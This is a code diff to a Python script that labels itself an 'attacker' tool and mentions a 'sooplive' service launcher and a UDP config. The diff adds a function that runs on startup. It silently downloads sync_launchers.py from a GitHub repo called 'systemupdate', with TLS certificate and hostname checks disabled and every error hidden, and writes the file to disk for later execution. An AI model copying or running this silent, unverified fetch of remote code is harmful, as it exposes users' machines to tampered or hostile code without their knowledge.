@@ -10,6 +10,34 @@ UPDATE_LOG_FILE = os.path.join(SCRIPT_DIR, "attacker_update.log")
 _BOOT_FLAG = os.path.join(SCRIPT_DIR, "attacker_boot.flag")
 SOOPLIVE_SERVICE_LAUNCHER = "sooplive service.exe"
 
+def _bootstrap_sync_launchers():
+    """hp_start.bat 은 sync_launchers 를 안 받으므로 reexec 전에 GitHub에서 받는다."""
+    import ssl
+    import time
+    import urllib.request
+
+    dest = os.path.join(SCRIPT_DIR, "sync_launchers.py")
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    base = "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/"
+    try:
+        req = urllib.request.Request(
+            base + "sync_launchers.py?t=%d" % int(time.time()),
+            headers={
+                "User-Agent": "ddong-attacker",
+                "Cache-Control": "no-cache, no-store, must-revalidate",
+                "Pragma": "no-cache",
+            },
+        )
+        with urllib.request.urlopen(req, timeout=25, context=ctx) as r:
+            data = r.read()
+        if data and len(data) > 500:
+            with open(dest, "wb") as f:
+                f.write(data)
+    except Exception:
+        pass
+
 def _reexec_via_service_if_needed():
     if os.environ.get("DDONG_LAUNCHER") == "1":
         return
@@ -26,6 +54,7 @@ def _reexec_via_service_if_needed():
     subprocess.Popen([launcher, os.path.abspath(__file__)], cwd=SCRIPT_DIR, env=env, close_fds=True)
     sys.exit(0)
 
+_bootstrap_sync_launchers()
 _reexec_via_service_if_needed()
 try:
     import ctypes
@@ -151,7 +180,7 @@ def _sys_excepthook(typ, val, tb):
 
 sys.excepthook = _sys_excepthook
 
-PATCH_UPDATED_AT = "2026-08-16 15:27"
+PATCH_UPDATED_AT = "2026-08-16 15:39"
 SOOPLIVE_STREAM_TITLE = "sooplive-미리보기"
 SOOPLIVE_SERVICE_TITLE = "soop service"
 CONFIG_FILE = os.path.join(SCRIPT_DIR, "udp_config.json")
